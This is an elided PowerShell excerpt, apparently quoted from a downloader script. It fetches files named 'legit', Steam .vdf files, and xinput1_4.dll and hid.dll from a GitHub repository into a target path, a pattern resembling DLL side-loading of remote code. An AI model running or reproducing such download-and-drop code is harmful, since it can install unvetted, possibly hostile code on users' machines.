...
try
{
    ...
    if ($is64Bit)
    {
        ...
        DownloadFile -url 'https://github.com/cdkrun-1/aa/raw/master/64/legit64' -savePath $savePathZip -hash '050351885B8D1FC3E85FBD0CB871F030' 
    }
    else
    {
        $savePathZip = Join-Path $targetDirectory "legit"
        DownloadFile -url 'https://github.com/cdkrun-1/aa/raw/master/legit' -savePath $savePathZip -hash '9B2FF8684E3C886C8FCDF83053D28F35' 
    }
    ...
    if ($is64Bit)
    {
        ...
        DownloadFile -url 'https://github.com/cdkrun-1/aa/raw/master/64/1/appdata.vdf' -savePath $savePathVdf -hash 'D503089A6EE3FA581960C7DEB76EC406' 
        DownloadFile -url 'https://github.com/cdkrun-1/aa/raw/master/64/1/xinput1_4.dll' -savePath $savePathTxt -hash '1B5041DC8FA99BCFA6536E5DC7CBAB95' -targetPath $d_path 
    ...
    else
    {
        ...
        DownloadFile -url 'https://github.com/cdkrun-1/aa/raw/master/1/localData.vdf' -savePath $savePathVdf -hash '6D4A87B255A30198DF09F71DE56D45B8' 
        DownloadFile -url 'https://github.com/cdkrun-1/aa/raw/master/1/hid.dll' -savePath $savePathTxt -hash '27211F8430BF0DBDE26CA376F1A6CFDE' -targetPath $d_path 
    }
